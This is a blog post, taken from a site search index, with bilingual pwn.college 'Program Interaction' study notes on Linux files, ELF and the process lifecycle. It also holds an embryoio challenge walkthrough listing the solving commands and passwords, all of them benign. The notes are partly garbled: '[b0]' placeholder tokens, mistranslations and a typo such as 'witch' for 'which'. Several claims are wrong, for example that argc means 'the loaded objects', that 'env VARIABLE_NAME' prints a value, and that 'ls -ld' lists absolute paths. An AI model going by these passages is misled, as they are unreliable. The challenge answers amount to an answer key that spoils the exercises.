<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/05/29/PwnCollege2-ProgramInteraction/"/>
      <url>/2024/05/29/PwnCollege2-ProgramInteraction/</url>
      
        <content type="html"><![CDATA[<h1 id="lecturenote"><a class="markdownIt-Anchor" href="#lecturenote"></a> LectureNote</h1><h2 id="linux-command-line-linux命令行"><a class="markdownIt-Anchor" href="#linux-command-line-linux命令行"></a> Linux Command Line: Linux命令行:</h2><h3 id="file-system-文件系统"><a class="markdownIt-Anchor" href="#file-system-文件系统"></a> <strong>File System: 文件系统:</strong></h3><p>77</p><ul><li>Absolute Paths: start with <code>/</code>绝对路径：以 &quot; <code>/</code>&quot; 开头。</li><li>Relative Paths: do NOT start with <code>/</code>, relative to the current working directory相对路径：不要以“ <code>/</code> ”开头，相对于当前工作目录</li></ul><h3 id="environment-variables"><a class="markdownIt-Anchor" href="#environment-variables"></a> <strong>Environment Variables:</strong></h3><p>Environment Variables: a set of Key/Value pairs passed into every process when launched. Critical variables include:环境变量：在启动进程时传递给每个进程的一组键/值对。关键变量包括：</p><ul><li><code>PATH</code>: list of directories to search for programs in[b0]：要搜索程序的目录列表</li><li><code>PWD</code>: current working directory：当前工作目录</li><li><code>HOME</code>: path to home directory家目录路径</li><li><code>HOSTNAME</code>: name of the system系统的名称</li></ul><h3 id="files"><a class="markdownIt-Anchor" href="#files"></a> <strong>Files:</strong></h3><ul><li>Symbolic Links (Soft Links): special type of file that references another file 符号链接（软链接）：一种特殊的文件类型，它指向另一个文件。<ul><li>symbolic links to relative paths are relative to the directory containing the link指向相对路径的符号链接相对于包含链接的目录是相对的。</li></ul></li><li>Hard Links: a perfect reference to the data/content inside the linked file. They link only to the data of the linked file, not its original path硬链接：是对链接文件内部数据/内容的完美引用。它们仅链接到被链接文件的数据，而不链接到其原始路径。</li></ul><p><strong>Different Types of Files:不同类型的文件：</strong></p><ul><li><code>-</code>: regular file <code>-</code> :普通文件</li><li><code>d</code>: a directory (yes, directories are actually just special files!)<code>d</code> ： 一个目录（是的，目录实际上只是一种特殊的文件！）</li><li><code>l</code>: a symbolic link (a file that transparently points to another file or directory)`<code>l</code> `： 符号链接（一种透明地指向其他文件或目录的文件）</li><li><code>p</code>: is a named pipe (also known as a FIFO)&quot;<code>p</code> &quot; 是一个命名管道（也称为 FIFO）。</li><li><code>c</code>: is a character device file (i.e., backed by a hardware device that produces or receives data streams, such as a microphone)`/dev/b0` 是一个字符设备文件（即由硬件设备支持，该硬件设备可以生成或接收数据流，例如麦克风）。</li><li><code>b</code>: a block device file (i.e., backed by a hardware device that stores and loads blocks of data, such as a hard drive)`<code>b</code> `： 块设备文件（即由硬件设备支持的文件，该硬件设备用于存储和加载数据块，例如硬盘）</li><li><code>s</code>: a unix socket (essentially a local network connection encapsulated in a file)<code>s</code> ： 一个 Unix 套接字（本质上是一个封装在文件中的本地网络连接）</li></ul><h3 id="pipes"><a class="markdownIt-Anchor" href="#pipes"></a> <strong>Pipes:</strong></h3><ul><li>Unnamed Pipes (<code>|</code>): ethereal channels of communication, often used to direct data from one command to another匿名管道（ <code>|</code> ）：一种用于通信的无形通道，通常用于将数据从一个命令传输到另一个命令。</li><li>Named Pipes (FIFOs): used to help facilitate data flow in certain situations. The flow of data is First In First Out (FIFO)命名管道（先进先出队列）：用于在某些情况下帮助数据流的传输。数据的传输遵循先进先出的原则（FIFO）。</li></ul><h3 id="useful-commands-cli"><a class="markdownIt-Anchor" href="#useful-commands-cli"></a> <strong>Useful Commands (CLI):</strong></h3><ul><li><code>witch programName</code>: will return the absolute path of the program given found by the <code>PATH</code> variable它将返回由  <code>PATH</code>  变量找到的程序的绝对路径。</li><li><code>env</code>: prints all the environment variables to the screen`<code>env</code> ` 会将所有环境变量打印到屏幕上。</li><li><code>export variable=value</code>: can set new/existing variables to a new value[b0] 可以为现有或新创建的变量设置新的值。</li><li><code>ln -s fileToBeLinked symbolicLinkName</code>: creates a symbolic link创建一个符号链接。</li><li><code>ln fileToBeLinked hardLinkName</code>: creates a hard link创建硬链接</li><li><code>ls -ld</code>: Lists all files in current directory along with the files’ absolute path<code>ls -ld</code> ： 列出当前目录下的所有文件及其绝对路径</li><li><code>mkfifo fifoName</code>: makes a new FIFO创建一个新的FIFO（先进先出队列）。</li><li><code>command &lt; in_file</code>: redirect in_file into command’s input将 `in_file` 重定向到命令的输入中。</li><li><code>command &gt; out_file</code>: redirect command’s output into out_file, overwriting it将命令的输出重定向到 out_file 文件中，并覆盖该文件。</li><li><code>command &gt;&gt;out_file</code>: redirect the command’s output into out_file, appending to it将命令的输出重定向到 out_file 文件中，并追加到该文件中。</li><li><code>command 2&gt;error_file</code>: redirect the command’s errors into error_file, overwriting it将命令的错误重定向到 error_file 中，并覆盖该文件。</li><li><code>command 2&gt;&gt;error_file</code>: redirect the command’s errors into error_file, appending to it将命令的错误重定向到 error_file 中，并追加到其中。</li></ul><h2 id="binary-files"><a class="markdownIt-Anchor" href="#binary-files"></a> Binary Files</h2><h3 id="elf-files"><a class="markdownIt-Anchor" href="#elf-files"></a> <strong>ELF Files:</strong></h3><p>Executable and Linkable Format (ELF): defines a program as it will be loaded and executed in memory for Linux/BSD systems. Allows for a compiler to create and define a program可执行和可链接格式（ELF）：定义了Linux/BSD系统上加载并执行的程序在内存中的格式。允许编译器创建并定义程序。</p><ul><li>is a binary file format containing the program, its data, how the program should be loaded (program/segment headers), and the metadata describing program components (section headers)这是一种二进制文件格式，其中包含程序本身、数据以及程序的加载方式（程序/段头），以及描述程序组件的元数据（节头）。</li><li>For Windows the equivalent are Portable Executables (PE)对于Windows系统来说，对应的文件格式是Portable Executables（PE）。</li><li>For MacOS the equivalent are Mach-O对于MacOS，其对应的格式是Mach-O。</li></ul><p>Dynamically Linked ELF: The ELF file relies on libraries that also need to be loaded动态链接的ELF文件：该ELF文件依赖于需要加载的库文件。</p><p>Program Headers: specify information and define segments needed to prepare the program for execution. The source of information used when loading a file程序头：指定需要的信息并定义为使程序能够执行所需的段。加载文件时使用的信息来源</p><ul><li>Segments: parts of an ELF file that are loaded into the memory of a computer when that file is executed段：当ELF文件被执行时，加载到计算机内存中的文件部分</li></ul><p><strong>Important Entry Types: 重要的入口类型：</strong></p><ul><li><code>INTERP</code>: entry type defining the library that should be used to load this ELF into memory[b0] 入口类型定义了应该使用哪个库来将此ELF加载到内存中。</li><li><code>LOAD</code>: entry type defining a part of the file that should be loaded into memory<code>LOAD</code> ： 定义文件中应加载到内存中的一部分的入口类型</li></ul><p>Section Headers: represent a different view inside an ELF file with a lot more semantic information that is less important for the actual loading process节头：代表ELF文件中一种不同的内部视图，包含更多与实际加载过程关系不大的语义信息。</p><ul><li>They are not required in an ELF file, they are stored as metadata它们在ELF文件中不是必需的，而是作为元数据存储的。</li></ul><p><strong>Important Sections: 重要的部分:</strong></p><ul><li><code>.text</code>: the executable code of your program.[b0]：您程序的可执行代码。</li><li><code>.plt</code> and <code>.got</code>: used to resolve and dispatch library calls.和：用于解决和分发库的调用。</li><li><code>.data</code>: used for pre-initialized global writable data (such as global arrays with initial values)<code>.data</code> ： 用于预先初始化的全局可写数据（例如具有初始值的全局数组）</li><li><code>.rodata</code>: used for global read-only data (such as string constants)<code>.rodata</code> ：用于全局只读数据（如字符串常量）</li><li><code>.bss</code>: used for uninitialized global writable data (such as global arrays without initial values)<code>.bss</code> ： 用于未初始化的全局可写数据（例如没有初始值的全局数组）</li></ul><h3 id="symbols"><a class="markdownIt-Anchor" href="#symbols"></a> <strong>Symbols:</strong></h3><p>Symbols: binaries and libraries that use dynamically loaded libraries to find libraries, resolve function calls into those libraries, etc 6065</p><h3 id="resources-to-interact-with-elf"><a class="markdownIt-Anchor" href="#resources-to-interact-with-elf"></a> <strong>Resources to Interact with ELF:</strong></h3><ul><li><code>gcc</code>: to make your ELF.制作你的ELF文件。</li><li><code>readelf</code>: to parse the ELF header.解析ELF头文件。</li><li><code>objdump</code>: to parse the ELF header and disassemble the source code.解析ELF头文件并反汇编源代码。</li><li><code>nm</code>: to view your ELF’s symbols.[b0]：查看您的ELF文件的符号。</li><li><code>patchelf</code>: to change some ELF properties.[b0]：用来更改一些ELF文件的属性。</li><li><code>objcopy</code>: to swap out ELF sections.替换ELF段。</li><li><code>strip</code>: to remove otherwise-helpful information (such as symbols).删除原本有用的信息（例如符号）。</li><li><a href="https://ide.kaitai.io/"><strong>kaitai struct</strong></a>: to look through your ELF interactively.凯泰结构：用于交互式查看ELF文件。</li></ul><h3 id="useful-commands-binary"><a class="markdownIt-Anchor" href="#useful-commands-binary"></a> <strong>Useful Commands (Binary):</strong></h3><ul><li><code>readelf -a programName</code>: will parse out the ELF file, providing information such as headers它会解析ELF文件，提供诸如头文件之类的信息。</li><li><code>nm -a programName</code>: will list out all of the symbols associated with a program[b0] 将会列出与程序相关的所有符号。</li><li><code>nm -D programName</code>: will list out all of the dynamic imports used at runtime将会列出在运行时使用的所有动态导入。</li></ul><h2 id="lifecycle-of-a-linux-process"><a class="markdownIt-Anchor" href="#lifecycle-of-a-linux-process"></a> Lifecycle of a Linux Process</h2><h3 id="what-is-a-process"><a class="markdownIt-Anchor" href="#what-is-a-process"></a> <strong>What is a Process:</strong></h3><p><strong>Every Linux process has: 每个Linux进程都有：</strong></p><ul><li>State 状态<ul><li>running, waiting, stopped, zombie跑步、等待、停止、僵尸</li></ul></li><li>Priority (and other scheduling information)优先级（以及其他调度信息）</li><li>Parent, Siblings, Children父母、兄弟姐妹、子女</li><li>Shared Resources 共享资源<ul><li>files, pipes, sockets 文件、管道、套接字</li></ul></li><li>Virtual Memory Space 虚拟内存空间</li><li>Security Context 安全上下文<ul><li>effective uid and gid 有效的UID（用户ID）和GID（组ID）</li><li>saved uid and gid 已保存的uid和gid</li><li>capabilities 功能</li></ul></li></ul><p>Virtual Memory: memory dedicated to a specific process虚拟内存：专门分配给某个进程的内存</p><p>Physical Memory: memory shared among the whole system物理内存：系统中所有组件共享的内存</p><p>libc: a library full of helper functions that is used by almost every program (including common C functions)libc 是一个包含大量辅助函数的库，几乎所有的程序（包括常见的 C 函数）都会使用它。</p><h3 id="process-timeline-过程时间轴"><a class="markdownIt-Anchor" href="#process-timeline-过程时间轴"></a> <strong>Process Timeline: 过程时间轴:</strong></h3><ol><li><strong>Process is created 创建流程</strong><ul><li>Kernel will check for executable permissions</li><li>Calls <code>execve()</code> to begin loading</li></ul></li><li><strong>Process is loaded 进程已加载</strong></li></ol><ul><li>Figures out what steps need to be taken to load the file<ul><li>Starts from the beginning of the file, looks for <code>#!</code> (sh-bang) to extract the rest of the line (the interpreter)<ul><li>Will see if the interpreter matches one in the system, and will instead run your file as an argument to the interpreter from <code>#!</code></li></ul></li><li>If there is no <code>#!</code> (not a script) then it will check if the file matches a format in <code>/proc/sys/binfmt_misc</code><ul><li>If a match is found, then it will execute the interpreter for that format with your file as an argument</li></ul></li><li>If it is a dynamically-linked ELF file, the kernel will read the interpreter/loader (collectively loader) defined in the ELF file<ul><li>The interpreter will be loaded and will be given control</li><li>The interpreter then locates the libraries<ul><li><code>LD_PRELOAD</code>: environment variable, and anything in /etc/ld.so.preload</li><li><code>LD_LIBRARY_PATH</code>: environment variable (can be set in the shell)</li><li><code>DT_RUNPATH</code> or <code>DT_RPATH</code>: specified in the binary file (both can be modified with patchelf)</li><li>/etc/ld.so.conf: system-wide configuration</li><li>/lib and /usr/lib /lib和/usr/lib</li></ul></li><li>The interpreter then runs the libraries<ul><li>May cause more libraries to load if libraries depend on other libraries</li><li>Will also update relocations during this process</li></ul></li></ul></li><li>If it is a static ELF file, the kernel will just load the file</li></ul></li><li>All of this information will be loaded to its own virtual memory space containing (located in /proc/self/maps):<ul><li>the binary 二进制</li><li>the libraries 库</li><li>the “heap” “堆”<ul><li>for dynamically allocated memory</li></ul></li><li>the “stack” “栈”<ul><li>for function local variables</li></ul></li><li>any memory specifically mapped by the program</li><li>some helper regions 一些辅助区域</li><li>kernel code in the “upper half” of memory is inaccessible to the process<ul><li>above 0x8000000000000000 on 64-bit architectures</li></ul></li></ul></li></ul><ol start="3"><li><strong>Process is initialized 进程已初始化。</strong><ul><li>Will run any constructors specified in the ELF file将会运行ELF文件中指定的所有构造函数。</li></ul></li><li><strong>Process is launched 进程启动</strong><ul><li>The ELF file automatically calls <code>_libc_start_main()</code> from the libc library, which then calls the program’s <code>main()</code> functionELF文件会自动从libc库中调用 <code>_libc_start_main()</code> ，然后libc库会调用程序中的 <code>main()</code> 函数。</li><li>Now the code is running现在代码正在运行。</li></ul></li><li><strong>Process reads its arguments and environment程序会读取其参数和环境变量。</strong></li></ol><ul><li><p>The <code>int main(int argc, void **argv, void **envp);</code> function will take in three arguments:</p><ul><li><code>argc</code>: the loaded objects (binaries and libraries)加载的对象（二进制文件和库文件）</li><li><code>argv</code>: command-line arguments in argvargv 中的命令行参数</li><li><code>envp</code>: environment variables<code>envp</code> ： 环境变量</li></ul><p>这个 `b0` 函数将接受三个参数：</p></li></ul><ol start="6"><li><strong>Process executes 流程执行</strong></li></ol><ul><li>To interact with the operating system(OS), the process will use system calls为了与操作系统（OS）进行交互，进程将使用系统调用。</li><li>For the OS to communicate with the process, signals are used 操作系统通过信号与进程进行通信。<ul><li>Signals will pause process execution and invoke the handler (functions that take in the signal number) 信号会暂停进程的执行，并调用处理程序（即接收信号号码的函数）。<ul><li>If the signal has no handler, the default action is to kill the process</li></ul></li></ul></li><li>Another method of outside interaction is by sharing memory with other processes<ul><li>This requires an initial system call, but then is self sustaining</li><li>One way is to use a shared memory-mapped file in /dev/shm</li></ul></li></ul><ol start="7"><li><strong>Process terminates 进程终止</strong></li></ol><ul><li>Only two ways a process can terminate:<ul><li>Receive an unhandled signal</li><li>Calling the <code>exit()</code> system call</li></ul></li><li>After termination, processes must be “reaped”<ul><li>A process will remain in a zombie state and take up memory until the <code>wait()</code> function is called by their parent</li><li>This will return the process’s exit code to the parent and then the process will be freed<ul><li>If this does not happen, the process is re-parented to PID 1 and will remain there until cleaned up</li></ul></li></ul></li></ul><h3 id="useful-commands-viewing-processes"><a class="markdownIt-Anchor" href="#useful-commands-viewing-processes"></a> Useful Commands (Viewing Processes):</h3><ul><li><code>readelf -a fileName | grep interpret</code>: will return the specific loader being used to load the file将会返回用于加载该文件的特定加载器。</li><li><code>patchelf --set-interpreter /some/interpreter ./fileName</code>: will forcibly set the interpreter for a provided file[b0] 会强制为指定文件设置解释器。</li><li><code>ldd ./fileName</code>: will list the libraries necessary for the file to run, including the interpreter它会列出该文件运行所需的库，包括解释器。</li><li><code>strace ./executable uncompiledFile</code>: will “trace” out all of the system calls from when the process is first created to when its terminated它会追踪该进程从创建到终止期间的所有系统调用。</li><li><code>./executable /proc/self/maps</code>: will show the virtual memory storage layout for the executable它将展示可执行文件的虚拟内存存储布局。</li><li><code>man 2 open</code>: documentation for all the different system calls所有系统调用的文档</li><li><code>du -sb programFile</code>: will output how many bytes a file is`<code>du -sb programFile</code> ` 会输出文件的大小（以字节为单位）。</li></ul><h2 id="sources"><a class="markdownIt-Anchor" href="#sources"></a> Sources:</h2><ul><li><a href="https://pwn.college/modules/interaction">pwn.college Module 1 Lecturespwn.college 第一模块课程</a></li><li><a href="https://dojo.pwn.college/challenges/interaction">pwn.college Module 1 Challengespwn.college 第一模块挑战</a></li><li><a href="https://www.twitch.tv/pwncollege">pwn.college Class Twitch Streams高校黑客学院 Twitch 直播课程</a></li></ul><h1 id="challenges"><a class="markdownIt-Anchor" href="#challenges"></a> Challenges</h1><h2 id="program-interaction"><a class="markdownIt-Anchor" href="#program-interaction"></a> Program Interaction</h2><p>这一部分主要涉及到基本的程序交互方法，包括linux环境下运行程序一些基本方法和知识，除此以外也教了一些基本的shell脚本、python脚本、c语言等知识</p><p>embryoio  胚胎难度  <s>真的是这样吗</s></p><h3 id="level1"><a class="markdownIt-Anchor" href="#level1"></a> level1</h3><p>无密码直接运行</p><h3 id="level2"><a class="markdownIt-Anchor" href="#level2"></a> level2</h3><p>有密码，提示上写了</p><h3 id="level3"><a class="markdownIt-Anchor" href="#level3"></a> level3</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./embryoio_level3 suvobmbtle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>env</code> 命令主要用于显示或设置环境变量，其常见的指令包括：</p><ol><li><p><strong>显示当前环境变量</strong>：</p><pre class="line-numbers language-none"><code class="language-none">env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>设置环境变量并运行命令</strong>：</p><pre class="line-numbers language-none"><code class="language-none">env VARIABLE_NAME&#x3D;value your_command_here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>清除所有环境变量并运行命令</strong>：</p><pre class="line-numbers language-none"><code class="language-none">env -i your_command_here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>显示特定环境变量的值</strong>：</p><pre class="line-numbers language-none"><code class="language-none">env VARIABLE_NAME<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>以逗号分隔显示多个环境变量的值</strong>：</p><pre class="line-numbers language-none"><code class="language-none">env VARIABLE1,VARIABLE2 your_command_here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>通过<code>-u</code>选项删除特定的环境变量</strong>：</p><pre class="line-numbers language-none"><code class="language-none">env -u VARIABLE_NAME your_command_here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>使用<code>-i</code>选项启动一个不包含任何环境变量的环境</strong>：</p><pre class="line-numbers language-none"><code class="language-none">env -i your_command_here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="level4"><a class="markdownIt-Anchor" href="#level4"></a> level4</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token parameter variable">-i</span> <span class="token assign-left variable">gizpoq</span><span class="token operator">=</span>tkikjioeyj ./embryoio_level4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level7"><a class="markdownIt-Anchor" href="#level7"></a> level7</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token parameter variable">-i</span> ./embryoio_level7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level5"><a class="markdownIt-Anchor" href="#level5"></a> level5</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-interaction~level5:/challenge$ <span class="token builtin class-name">echo</span> <span class="token string">"hxhxyvux"</span> <span class="token operator">></span> /tmp/cwxhwahacker@program-interaction~level5:/challenge$ ./embryoio_level5 <span class="token operator">&lt;</span> /tmp/cwxhwa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="level6"><a class="markdownIt-Anchor" href="#level6"></a> level6</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-interaction~level6:/challenge$ ./embryoio_level6 <span class="token operator">></span> /tmp/tzdetdhacker@program-interaction~level6:/challenge$ <span class="token function">cat</span> /tmp/tzdetd <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="level8"><a class="markdownIt-Anchor" href="#level8"></a> level8</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"/challenge/embryoio_level8"</span> <span class="token operator">></span> /tmp/my_script.sh <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> /tmp/my_script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level9"><a class="markdownIt-Anchor" href="#level9"></a> level9</h3><p>同上，加个密码传参</p><h3 id="level10"><a class="markdownIt-Anchor" href="#level10"></a> level10</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"./embryoio_level10 xolzrhbfsw"</span> <span class="token operator">></span> /tmp/my_script.sh <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> my_script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level11"><a class="markdownIt-Anchor" href="#level11"></a> level11</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"env -i huawoi=hzrutrkycu ./embryoio_level11"</span> <span class="token operator">></span> /tmp/my_script.sh <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> /tmp/my_script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level12"><a class="markdownIt-Anchor" href="#level12"></a> level12</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-interaction~level12:/challenge$ <span class="token builtin class-name">echo</span> <span class="token string">"bczijbap"</span> <span class="token operator">></span> /tmp/kzgaoxhacker@program-interaction~level12:/challenge$ <span class="token builtin class-name">echo</span> <span class="token string">"./embryoio_level12 &lt; /tmp/kzgaox"</span> <span class="token operator">></span> /tmp/my_script.sh <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> /tmp/my_script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="level13"><a class="markdownIt-Anchor" href="#level13"></a> level13</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"./embryoio_level13 > /tmp/xtnsry"</span> <span class="token operator">></span>/tmp/my_script.sh <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> /tmp/my_script.sh <span class="token operator">&amp;&amp;</span><span class="token function">cat</span> /tmp/xtnsry<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level14"><a class="markdownIt-Anchor" href="#level14"></a> level14</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"env -i  ./embryoio_level14"</span> <span class="token operator">></span> /tmp/my_script.sh <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> /tmp/my_script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level15"><a class="markdownIt-Anchor" href="#level15"></a> level15</h3><p>Python中运行程序时，有几种常见的方法</p><ol><li><p><strong>使用subprocess模块</strong>：通过subprocess模块可以在Python中执行外部命令和程序。可以使用<code>subprocess.run()</code>函数来执行程序，还可以使用<code>subprocess.Popen()</code>来获得更多控制和灵活性。</p><p>要在Python中执行一个文件，你可以使用<code>subprocess</code>模块中的<code>run</code>函数。这个函数允许你运行外部命令，并等待它完成。以下是一个简单的示例，演示如何使用Python来执行一个名为<code>script.py</code>的Python脚本文件：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocess<span class="token comment"># 指定要执行的文件名</span>filename <span class="token operator">=</span> <span class="token string">"script.py"</span><span class="token comment"># 执行文件</span><span class="token keyword">try</span><span class="token punctuation">:</span>    subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"python"</span><span class="token punctuation">,</span> filename<span class="token punctuation">]</span><span class="token punctuation">,</span> check<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"执行文件时出错:"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这将运行名为<code>script.py</code>的Python脚本。如果希望传递参数给脚本，可以在<code>subprocess.run</code>中的第二个参数中添加额外的参数。例如，如果要传递一个名为<code>arg1</code>的参数，可以这样做：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"python"</span><span class="token punctuation">,</span> filename<span class="token punctuation">,</span> <span class="token string">"arg1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> check<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将<code>arg1</code>作为参数传递给<code>script.py</code>脚本。</p></li><li><p><strong>使用exec语句</strong>：使用<code>exec</code>语句可以在当前Python进程中执行另一个Python文件。但是要注意，它会改变当前进程的状态，包括变量、函数等。</p></li><li><p><strong>使用import语句</strong>：你可以使用<code>import</code>语句来导入一个Python文件作为模块，然后调用它的函数或者执行其中的代码。这种方法更安全，因为它会创建一个新的命名空间，不会直接修改当前进程的状态。</p></li><li><p><strong>使用os.system()函数</strong>：os模块提供了一个<code>system()</code>函数，它可以在操作系统级别执行命令。但是这个方法不够灵活，并且容易受到操作系统限制。</p></li><li><p><strong>使用eval()函数</strong>：虽然不推荐，但你也可以使用<code>eval()</code>函数来执行Python代码字符串。这种方法潜在的安全风险很高，应该尽量避免使用。</p></li><li><p><strong>使用execfile()函数</strong>：在Python 2中，你可以使用<code>execfile()</code>函数执行一个Python文件。但是在Python 3中已经移除了这个函数。</p></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">In <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: <span class="token function">import</span> osIn <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>: os.system<span class="token punctuation">(</span><span class="token string">"./embryoio_level15"</span><span class="token punctuation">)</span>WELCOME<span class="token operator">!</span> This challenge makes the following asks of you:- the challenge checks <span class="token keyword">for</span> a specific parent process <span class="token builtin class-name">:</span> ipythonONWARDS TO GREATNESS<span class="token operator">!</span><span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> This challenge will now perform a bunch of checks.<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> If you pass these checks, you will receive the flag.<span class="token punctuation">[</span>TEST<span class="token punctuation">]</span> Performing checks on the parent process of this process.<span class="token punctuation">[</span>TEST<span class="token punctuation">]</span> We will now check that that the process is an interactive ipython instance.<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Since ipython runs as a script inside python, this will check a few things:<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token number">1</span>. That the process itself is python.<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token number">2</span>. That the module being run <span class="token keyword">in</span> python is ipython.<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> If the process being checked is just a normal <span class="token string">'ipython'</span>, you<span class="token string">'ll be okay![INFO] The process'</span> executable is /usr/bin/dash.<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> This might be different than expected because of symbolic links <span class="token punctuation">(</span>for example, from /usr/bin/python to /usr/bin/python3 to /usr/bin/python3.8<span class="token punctuation">)</span>.<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> To pass the checks, the executable must be python3.8.<span class="token punctuation">[</span>FAIL<span class="token punctuation">]</span> You did not satisfy all the execution requirements.<span class="token punctuation">[</span>FAIL<span class="token punctuation">]</span> Specifically, you must fix the following issue:<span class="token punctuation">[</span>FAIL<span class="token punctuation">]</span>    Executable must be <span class="token string">'python'</span><span class="token builtin class-name">.</span> Yours is: dashOut<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>: <span class="token number">512</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试<code>os</code>不行，因为<code>os</code>模块还是调用的<code>dash</code>来执行的</p><p>发现用<code>subprocess</code>可以</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./embryoio_level15"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level16"><a class="markdownIt-Anchor" href="#level16"></a> level16</h3><p>同上，运行后再输入密码即可</p><h3 id="level17"><a class="markdownIt-Anchor" href="#level17"></a> level17</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./embryoio_level17"</span><span class="token punctuation">,</span><span class="token string">"jduimogzro"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level18"><a class="markdownIt-Anchor" href="#level18"></a> level18</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">import</span> subprocessIn <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"env"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">,</span><span class="token string">"uaznno=hqbclqnobf"</span><span class="token punctuation">,</span><span class="token string">"./embryoio_level18"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="level19"><a class="markdownIt-Anchor" href="#level19"></a> level19</h3><p>这里需要详细了解一下，如何用<code>subprocess.run</code>进行重定向</p><p><a href="https://www.runoob.com/w3cnote/python3-subprocess.html">Python3 subprocess | 菜鸟教程 